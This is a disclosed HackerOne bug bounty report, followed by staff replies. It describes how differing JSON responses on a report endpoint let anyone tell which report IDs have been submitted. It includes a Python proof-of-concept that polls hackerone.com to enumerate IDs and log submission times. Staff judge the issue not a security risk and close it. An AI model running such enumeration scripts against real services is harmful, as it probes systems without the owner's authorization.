title: Ability to monitor reports' submission in real time

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
Hey ,

I would like to report an issue with the server responses that allow anyone users to monitor and track the reports' submission and the platform activity .

##Description :

The issue occurs on the endpoint '/reports/[report_id].json' due to the difference between server responses for submitted reports and  the yet not submitted ones .

If the report is already submitted and the logged in user has no access to it the html response will return a message saying `Oops! You can't access this report because it isn't public yet.` and the JSON response will return a blank page , zero length .

And if the report id passed to the endpoint hasn't been submitted yet , the HTML response will return a not found page , and the JSON response will return `{"status":"404","error":"Not Found"}` .

##PoC :

I wrote a simple python script can exploit this behaviour , it's my first pentesting python script by the way , sorry for the poor coding , I just learned how to do this today but you'll get the idea  :

```
import requests
import time
from datetime import datetime

start = raw_input("\nEnter the last report you know about [Ignore if before #159875]: ")
if start == '' :
    start = 159874
else :
    start = int(start)

if start < 159874 :
    start = 159874

def getReport(report):
    url = 'https://hackerone.com/reports/%s.json' % str(report)
    res = requests.get(url)
    l = len(res.text)
    if l == 36 :
        return 0 
    else:
        return 1 

def lastReport(start):
    for report in range( start ,1000000):
        if getReport(report):
            continue
        else :
            report = report - 1
            return report

last = lastReport(start)
print "\n[+]Last submitted report is : #%s\n" % str(last)

def getNext(last):
    report = last + 1
    if getReport(report):
        now = datetime.now()
        print "Report number #%s has been submited at %s/%s/%s %s:%s\n" % (report , now.month, now.day, now.year, now.hour, now.minute)
        last = report
        getNext(last)
    else :
        time.sleep(30)
        last = report - 1
        getNext(last)

getNext(last)
```
As the markdown missed up the code a bit I'm attaching it in two files 
F112672 => works well on Windows
F112671 => works well on Linux

The output of the script would be like :

{F112668}
{F112670}

Basically it records the date and time of every newly submitted report , of course that can be improved to generate hourly or daily reports about the platform activities , when hackers are mostly active , how frequent reports are submitted on H1 and so on , all is normally undisclosed information , only platform operator should know about .

##Impact :

I think it's too permissive for a highly secure platform to leave a way open for third parties to track its activity and its user interactions with the platform , which considered as privilege information only platform operators should be allowed to get their hands onto .

Thank you guys , glad that I've learned something new today specifically for this report , hope it qualifies and worth addressing . 

Best regards ,
Thanks ,
vulnerability_information_html:
Hey ,

I would like to report an issue with the server responses that allow anyone users to monitor and track the reports' submission and the platform activity .

Description :

The issue occurs on the endpoint '/reports/[report_id].json' due to the difference between server responses for submitted reports and the yet not submitted ones .

If the report is already submitted and the logged in user has no access to it the html response will return a message saying Oops! You can't access this report because it isn't public yet. and the JSON response will return a blank page , zero length .

And if the report id passed to the endpoint hasn't been submitted yet , the HTML response will return a not found page , and the JSON response will return {"status":"404","error":"Not Found"} .

PoC :

I wrote a simple python script can exploit this behaviour , it's my first pentesting python script by the way , sorry for the poor coding , I just learned how to do this today but you'll get the idea :

import requests
import time
from datetime import datetime

start = raw_input("\nEnter the last report you know about [Ignore if before #159875]: ")
if start == '' :
    start = 159874
else :
    start = int(start)

if start < 159874 :
    start = 159874

def getReport(report):
    url = 'https://hackerone.com/reports/%s.json' % str(report)
    res = requests.get(url)
    l = len(res.text)
    if l == 36 :
        return 0 
    else:
        return 1 

def lastReport(start):
    for report in range( start ,1000000):
        if getReport(report):
            continue
        else :
            report = report - 1
            return report

last = lastReport(start)
print "\n[+]Last submitted report is : #%s\n" % str(last)

def getNext(last):
    report = last + 1
    if getReport(report):
        now = datetime.now()
        print "Report number #%s has been submited at %s/%s/%s %s:%s\n" % (report , now.month, now.day, now.year, now.hour, now.minute)
        last = report
        getNext(last)
    else :
        time.sleep(30)
        last = report - 1
        getNext(last)

getNext(last)

As the markdown missed up the code a bit I'm attaching it in two files
h1-py2.py (F112672) => works well on Windows
h1-py3.py (F112671) => works well on Linux

The output of the script would be like :


Basically it records the date and time of every newly submitted report , of course that can be improved to generate hourly or daily reports about the platform activities , when hackers are mostly active , how frequent reports are submitted on H1 and so on , all is normally undisclosed information , only platform operator should know about .

Impact :

I think it's too permissive for a highly secure platform to leave a way open for third parties to track its activity and its user interactions with the platform , which considered as privilege information only platform operators should be allowed to get their hands onto .

Thank you guys , glad that I've learned something new today specifically for this report , hope it qualifies and worth addressing .

Best regards ,
Thanks ,

activities.message:
Hi @saeedhashem,

Why do you feel this is a security issue? Specifically,
- Are you able to track which users are interacting with the platform and/or specific reports?
- Are you able to track which programs are receiving the reports?
- Are you able to obtain any sensitive information that can be used against HackerOne or any of its customers?

If none of the above apply, we can't consider the behavior to be a security issue because there are many, many other things you can track if you tried. For example,
- What user/program handles have been claimed
- What reports are being disclosed
- How many reports are being resolved, how many hackers are being thanked, or how many programs have become public (these are actually explicitly listed on the home page https://hackerone.com/)

activities.message:
Thanks for your quick response .

As I've mentioned in the `Impact` section , this monitoring frequency of reports' submission explicitly describes how active or inactive the platform is  , usually this information isn't public .

The other mentioned traceable incidents are intentionally left public and don't have any specific meaning in and by themselves , unlike the behaviour in this report , which I believe it's not intentionally allowed .

Please , consider consulting one or more other team members if they agree or disagree with you , just to be sure that I'm fairly assessed .

If you disagree you can just close the report , as informative if I may request .

Thanks for your time .

activities.message:
If I may refer to this specific report #127620 , it is not typically the same but but they are some how similar .

The explanation was that the disclosure of metadata about undisclosed report .

Let's say that I submitted a duplicate bug , and the team assigned the original report to the duplicate status but didn't add me to the original report , now I know the report Id and if I have a log of every report's submission time using the reported behaviour , then I would know  the report's submission time and date and knew that it belongs to this or that program  , which considered as "Meta data" about undisclosed report , data that's not supposed to be public .

I don't usually like to refer to other disclosed reports to justify my point of view , but I thought it might somehow clear things up regarding this situation . 

 Thanks ,

I don't usually like to refer to other disclosed reports to justify my point of view , but I thought it might somehow clear things up regarding this situation .

Thanks ,

activities.message:
Hi @saeedhashem,

Even if you did log all that information, you wouldn't have the information that #127620 was leaking (the combined team, reporter, and ID). As such, I don't feel that they are similar at all, as all you know is that a report ID was filed at a certain time, but no additional info about it. There's nothing sensitive about that particular information, and while perhaps it could be used to gain some better insights into how researchers work, it doesn't actually leak specific information about the reports, the teams, or even the reporters. #127620 is focused solely on metadata that should not be public yet.

As there is no security issue here, I am closing this as N/A. We look forward to future reports from you concerning actionable security vulnerabilities. Happy hacking!

It was quit an experience ,  so I consider it a winning situation anyways .

Thanks ,

activities.message: Hi @saeedhashem, just wanted to say that I think it's amazing how much effort you put into this report, great job! Because of that, we wanted to let you know that we closed this report as N/A by mistake. You've shown that you're clearly onto something, but as @reed pointed out already, this had very minimal (if any) security implications. Because this report is already disclosed, we can't reopen it anymore (the internet doesn't forget, ha!). We welcome more reports like this in the future, we clearly see you're progressing. Thanks again and happy hacking!

activities.message:
Oh , thank you very much @jobert  , glad to hear that and sorry that I rushed into the disclosure , lesson to be learned though :)
It just took me some effort and time so I didn't like to be wasted for nothing , that's why I thought that I should share it with my friends at least .

That said , it's totally okay to fix the root cause of the issue even this was closed as N/A , I'm not going to complain about it .

Thanks again @jobert and many thanks to HackerOne that gives us such awesome opportunities to learn new amazing stuff .

Regards ,
